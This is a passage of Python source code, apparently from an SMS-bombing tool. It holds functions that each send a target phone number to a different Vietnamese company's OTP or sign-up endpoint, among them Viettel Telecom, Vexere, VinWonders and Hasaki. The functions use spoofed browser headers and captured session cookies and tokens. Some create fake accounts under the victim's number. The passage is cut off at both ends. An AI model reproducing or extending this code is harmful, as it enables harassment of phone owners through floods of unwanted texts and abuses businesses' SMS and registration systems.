        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': phone,
    }

    try:
        response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/resend', params=params, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PANTIORESEND | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("PANTIORESEND | TRẠNG THÁI : Thất Bại Fuck")



def winny(phone):
    cookies = {
        'PHPSESSID': '1ead98730f607548ac0c2f370f8c2dbe',
        'X-Magento-Vary': '3ea997b53ecbf5fe274e7bf3c497ad101c488a4c',
        'form_key': 'p2sTfiaO8ihlRup7',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'form_key': 'p2sTfiaO8ihlRup7',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'private_content_version': '87379c6193f6b8c7933f3a0f50cec8ef',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=1ead98730f607548ac0c2f370f8c2dbe; X-Magento-Vary=3ea997b53ecbf5fe274e7bf3c497ad101c488a4c; form_key=p2sTfiaO8ihlRup7; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; form_key=p2sTfiaO8ihlRup7; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; private_content_version=87379c6193f6b8c7933f3a0f50cec8ef',
        'origin': 'https://winny.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://winny.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'mobileNumber': phone,
        'maxTimesToResend': '2',
        'timeAlive': '180',
        'timeCountDownToResend': '300',
        'form_key': 'p2sTfiaO8ihlRup7',
    }

    try:
        response = requests.post('https://winny.com.vn/otp/otp/send', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WINNY | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("WINNY | TRẠNG THÁI : Thất Bại Fuck")



def owen(phone):
    cookies = {
        'form_key': 'mVMv3IDcYvxwDHNH',
        'form_key': 'mVMv3IDcYvxwDHNH',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'PHPSESSID': 'd040280e2517e2280569a7db522d5988',
        'mage-messages': '',
        'section_data_ids': '%7B%22insiderSection%22%3A1721578899%7D',
        'private_content_version': 'a38eb3ce2c465d1e78c1d0d15bd51ee4',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=mVMv3IDcYvxwDHNH; form_key=mVMv3IDcYvxwDHNH; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; PHPSESSID=d040280e2517e2280569a7db522d5988; mage-messages=; section_data_ids=%7B%22insiderSection%22%3A1721578899%7D; private_content_version=a38eb3ce2c465d1e78c1d0d15bd51ee4',
        'origin': 'https://owen.vn',
        'priority': 'u=1, i',
        'referer': 'https://owen.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'mobileNumber': phone,
        'maxTimesToResend': '2',
        'timeAlive': '180',
        'timeCountDownToResend': '300',
        'form_key': 'mVMv3IDcYvxwDHNH',
    }

    try:
        response = requests.post('https://owen.vn/otp/otp/send', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("OWEN | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("OWEN | TRẠNG THÁI : Thất Bại Fuck")



def befood(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app_version': '11261',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjowLCJhdWQiOiJndWVzdCIsImV4cCI6MTcyMTY2NjE0MiwiaWF0IjoxNzIxNTc5NzQyLCJpc3MiOiJiZS1kZWxpdmVyeS1nYXRld2F5In0.hTY2ucbYZBKKCNsUaypZ1fyjVSmAN77YjfP2Iyyrs1Y',
        'content-type': 'application/json',
        'origin': 'https://food.be.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://food.be.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_no': phone,
        'uuid': '6b83df66-d9ad-4ef0-86d9-a235c5e83aa7',
        'is_from_food': True,
        'is_forgot_pin': False,
        'locale': 'vi',
        'app_version': '11261',
        'version': '1.1.261',
        'device_type': 3,
        'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
        'customer_package_name': 'xyz.be.food',
        'device_token': '2a5886db48531ea9feb406f8801a3edd',
        'ad_id': '',
        'screen_width': 360,
        'screen_height': 640,
        'client_info': {
            'locale': 'vi',
            'app_version': '11261',
            'version': '1.1.261',
            'device_type': 3,
            'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
            'customer_package_name': 'xyz.be.food',
            'device_token': '2a5886db48531ea9feb406f8801a3edd',
            'ad_id': '',
            'screen_width': 360,
            'screen_height': 640,
        },
        'latitude': 10.77253621500006,
        'longitude': 106.69798153800008,
    }

    try:
        response = requests.post('https://gw.be.com.vn/api/v1/be-delivery-gateway/user/login', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEFOOD | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("BEFOOD | TRẠNG THÁI : Thất Bại Fuck")



def foodhubzl(phone):
    cookies = {
        'tick_session': 'f0s3e78s49netpa8583ggjedo5fiabkj',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'tick_session=f0s3e78s49netpa8583ggjedo5fiabkj',
        'Origin': 'https://account.ab-id.net',
        'Referer': 'https://account.ab-id.net/auth/login?token=73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563&destination=https://www.foodhub.vn',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'access_token': '73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563',
        'destination': 'https://www.foodhub.vn',
        'site_token': '',
        'phone_number': phone,
        'remember_account': '1',
        'type': 'zalootp',
        'country': '+84',
        'country_code': 'VN',
    }

    try:
        response = requests.post('https://account.ab-id.net/auth/get_form_phone_code', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FOODHUBZL ABAHA | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("FOODHUBZL ABAHA | TRẠNG THÁI : Thất Bại Fuck")



def heyu(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app-version': '70814',
        'authorization': '8996e28efe64d52bcea12d5165ebae17',
        'content-type': 'application/json',
        'origin': 'https://book.heyu.vn',
        'priority': 'u=1, i',
        'referer': 'https://book.heyu.vn/login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': phone,
        'regionName': None,
        'nativeVersion': 2027,
        'reqT': 1721580987444,
    }

    try:
        response = requests.post('https://book.heyu.vn/api/sms/send-code', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HEYU | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("HEYU | TRẠNG THÁI : Thất Bại Fuck")



def vttelecom(phone):
    cookies = {
        'laravel_session': 'pvF1ChVUx4SoKvqJr0AZsT0MrISq9JKrj3Xz6K8x',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6Inh1dGZLOHBRekpmeXJcL1huTDBHc2t3PT0iLCJ2YWx1ZSI6IjZidWtLendZWWM2bWxjTmVRRU8xZUdid3lIZ1NQeUJVaUVcL3lkZVpSc1pqSEpQU0ZaWERYekYweFA4UzJCWVM0IiwibWFjIjoiMWY3ZjA5OGUxYzZjNmUzYTA1ZTQwM2JkMGZmOTVmMTFiZjA1YWE3MGE3NmQ2ZWVjODE1NDAwMjcxNGU0NjNjZCJ9',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=pvF1ChVUx4SoKvqJr0AZsT0MrISq9JKrj3Xz6K8x; redirectLogin=https://vietteltelecom.vn/dang-ky; XSRF-TOKEN=eyJpdiI6Inh1dGZLOHBRekpmeXJcL1huTDBHc2t3PT0iLCJ2YWx1ZSI6IjZidWtLendZWWM2bWxjTmVRRU8xZUdid3lIZ1NQeUJVaUVcL3lkZVpSc1pqSEpQU0ZaWERYekYweFA4UzJCWVM0IiwibWFjIjoiMWY3ZjA5OGUxYzZjNmUzYTA1ZTQwM2JkMGZmOTVmMTFiZjA1YWE3MGE3NmQ2ZWVjODE1NDAwMjcxNGU0NjNjZCJ9',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-CSRF-TOKEN': 'kCEEt6Zt56F539TFqOWtR0tv386D3EOXzYIIg8K7',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Inh1dGZLOHBRekpmeXJcL1huTDBHc2t3PT0iLCJ2YWx1ZSI6IjZidWtLendZWWM2bWxjTmVRRU8xZUdid3lIZ1NQeUJVaUVcL3lkZVpSc1pqSEpQU0ZaWERYekYweFA4UzJCWVM0IiwibWFjIjoiMWY3ZjA5OGUxYzZjNmUzYTA1ZTQwM2JkMGZmOTVmMTFiZjA1YWE3MGE3NmQ2ZWVjODE1NDAwMjcxNGU0NjNjZCJ9',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    try:
        response = requests.post('https://vietteltelecom.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VTTELECOM | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("VTTELECOM | TRẠNG THÁI : Thất Bại Fuck")



def vinwonders(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'channel': 10,
        'UserName': phone,
        'Type': 1,
        'OtpChannel': 1,
    }

    try:
        response = requests.post(
            'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
            headers=headers,
            json=json_data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINWONDERS | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("VINWONDERS | TRẠNG THÁI : Thất Bại Fuck")



def vietair(phone):
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Referer': 'https://vietair.com.vn/khach-hang-than-quen/dang-ky',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': phone,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    try:
        response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETAIR | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("VIETAIR | TRẠNG THÁI : Thất Bại Fuck")



def vexere(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'authorization': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOjIsInVzciI6ImZlIiwiY2lkIjoiYTRlYWM1MDAtMzYyNC0xMWU1LWFjOWUtMDkxMjRjNjAxMDEzIiwiZXhwIjoxNzIxODAxOTQ0fQ.f5G-W3dbA-rcY3JAF1WShz-6-Nl32TNXKFpFimceF1g',
        'content-type': 'application/json',
        'origin': 'https://vexere.com',
        'priority': 'u=1, i',
        'referer': 'https://vexere.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': f'+84{phone}',
        'lang': 'vi-VN',
    }

    try:
        response = requests.post('https://user-profile-service.vexere.com/v2/auth/send_otp', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VEXERE | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("VEXERE | TRẠNG THÁI : Thất Bại Fuck")



def atadi(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.atadi.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.atadi.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'type': 'phone',
        'phone': phone,
        'lastMessage': 'NEW_MEMBER_UI_2',
    }

    try:
        response = requests.post('https://www.atadi.vn/addon/tds/register2', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ATADI | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("ATADI | TRẠNG THÁI : Thất Bại Fuck")



def etrip4u(phone):
    cookies = {
        'language': 'vi',
        'departureCityHolder': 'Ho%2520Chi%2520Minh%2520(SGN)',
        'departureCity': 'SGN',
        'arrivalCityHolder': 'Ha%2520Noi%2520(HAN)',
        'arrivalCity': 'HAN',
        'journeyType': '1',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'language=vi; departureCityHolder=Ho%2520Chi%2520Minh%2520(SGN); departureCity=SGN; arrivalCityHolder=Ha%2520Noi%2520(HAN); arrivalCity=HAN; journeyType=1; G_ENABLED_IDPS=google',
        'origin': 'https://www.etrip4u.com',
        'priority': 'u=1, i',
        'referer': 'https://www.etrip4u.com/Account/MemberRegister',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'Email': '',
        'Phone': phone,
        'FullName': 'quoc tien huy',
        'Username': phone,
        'Password': '123123123',
        'ConfirmPassword': '123123123',
    }

    try:
        response = requests.post('https://www.etrip4u.com/Account/MemberRegister', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ETRIP4U | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("ETRIP4U | TRẠNG THÁI : Thất Bại Fuck")



def tinyworld(phone):
    cookies = {
        'connect.sid': 's%3AHmACN8Z1lX11BIubkvf3PeJnysiaX-nN.AFYPV3%2BEkso8%2Fuot1D3Xg7SCuuEFLcaS18gNzdO%2B%2F1I',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'connect.sid=s%3AHmACN8Z1lX11BIubkvf3PeJnysiaX-nN.AFYPV3%2BEkso8%2Fuot1D3Xg7SCuuEFLcaS18gNzdO%2B%2F1I',
        'origin': 'https://prod-tini-id.nkidworks.com',
        'priority': 'u=0, i',
        'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com/dia-diem-va-gia-ve.html',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_csrf': '',
        'clientId': '609168b9f8d5275ea1e262d6',
        'redirectUrl': 'https://tiniworld.com/dia-diem-va-gia-ve.html',
        'phone': phone,
    }

    try:
        response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TINYWORLD | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("TINYWORLD | TRẠNG THÁI : Thất Bại Fuck")



def chudu24(phone):
    cookies = {
        'CheckInDate': '23/07/2024',
        'CheckOutDate': '24/07/2024',
        'pt_source': 'adwords',
        'cf_clearance': 'dY0UC1ClhLpZCQWOutmn5LXXs7ZcjxJ9ftSPGGq1z4Q-1721624098-1.0.1.1-v7sKuGxYoHqQtL_l2.oKo6R7MOvSS_q4L4WgtHQ2Fql_RJEC30So2DWrkiLhYnDWQimgC.0aRO69K4jfUI.DMg',
        'connect.sid': 's%3AwCkFVPi1y-Wa-2dlrVmxU6xiY-4igLJ9.aIQ%2B9e1UbkLgFQFKq%2FGmdphr83G30Jhfjn%2FfH%2FcxwlU',
        'timePopup': '297000',
        'openPopupMember': '',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CheckInDate=23/07/2024; CheckOutDate=24/07/2024; pt_source=adwords; cf_clearance=dY0UC1ClhLpZCQWOutmn5LXXs7ZcjxJ9ftSPGGq1z4Q-1721624098-1.0.1.1-v7sKuGxYoHqQtL_l2.oKo6R7MOvSS_q4L4WgtHQ2Fql_RJEC30So2DWrkiLhYnDWQimgC.0aRO69K4jfUI.DMg; connect.sid=s%3AwCkFVPi1y-Wa-2dlrVmxU6xiY-4igLJ9.aIQ%2B9e1UbkLgFQFKq%2FGmdphr83G30Jhfjn%2FfH%2FcxwlU; timePopup=297000; openPopupMember=',
        'origin': 'https://www.chudu24.com',
        'priority': 'u=0, i',
        'referer': 'https://www.chudu24.com/tai-khoan/dang-ky?ReturnUrl=%2F%2Fwww.chudu24.com%2Ftai-khoan%2Fdang-nhap?ReturnUrl=https%3A%2F%2Fwww.chudu24.com%2F%3Fpt_source%3Dadwords%26pt_campaign%3D%26pt_adgroupid%3D8399610561%26pt_device%3Dc%26pt_devicemodel%3D%26gad_source%3D1%26gclid%3DCjwKCAjw4_K0BhBsEiwAfVVZ_yP5YFJ7dq7yi4H5IsJyx3kjbqnH11zNGhZ5UdCQUhvXAP8X5-qcpBoC0ygQAvD_BwE',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_csrf': '',
        'ReturnUrl': '//www.chudu24.com/tai-khoan/dang-nhap?ReturnUrl=https://www.chudu24.com/?pt_source=adwords&pt_campaign=&pt_adgroupid=8399610561&pt_device=c&pt_devicemodel=&gad_source=1&gclid=CjwKCAjw4_K0BhBsEiwAfVVZ_yP5YFJ7dq7yi4H5IsJyx3kjbqnH11zNGhZ5UdCQUhvXAP8X5-qcpBoC0ygQAvD_BwE',
        'typeMember': 'CANHAN',
        'email': phone,
        'password': '123123',
    }

    try:
        response = requests.post('https://www.chudu24.com/tai-khoan/ajax-dang-ky-web', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CHUDU24 | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("CHUDU24 | TRẠNG THÁI : Thất Bại Fuck")
    


def sojo(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Authorization': '',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://sojohotels.com',
        'Referer': 'https://sojohotels.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'lang': 'vi',
    }

    json_data = {
        'phone': phone,
        'fullName': 'ko co ten',
        'email': 'fasfa@gmail.com',
        'password': '1234',
        'nationalityCode': '+84',
        'nationalityAlphaCode': 'VN',
        'isReceiveMessage': False,
        'isLoyaltyUser': True,
        'isPolicy': True,
        'isSubmit': False,
        'deviceToken': None,
        'osType': 'web',
    }

    try:
        response = requests.post('https://api.sojohotels.com/account/api/v2/user/register', params=params, headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SOJO | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("SOJO | TRẠNG THÁI : Thất Bại Fuck")



def hasaki(phone):
    cookies = {
        'sessionChecked': '1721624886',
        'HASAKI_SESSID': 'b5a41e810a240f4d2446e6241c78407a',
        'form_key': 'b5a41e810a240f4d2446e6241c78407a',
        'utm_hsk': '%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D',
        'PHPSESSID': 'ofu3g6vsn92b0iqiu4i28e82s0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': 'sessionChecked=1721624886; HASAKI_SESSID=b5a41e810a240f4d2446e6241c78407a; form_key=b5a41e810a240f4d2446e6241c78407a; utm_hsk=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D; PHPSESSID=ofu3g6vsn92b0iqiu4i28e82s0',
        'priority': 'u=1, i',
        'referer': 'https://hasaki.vn/',
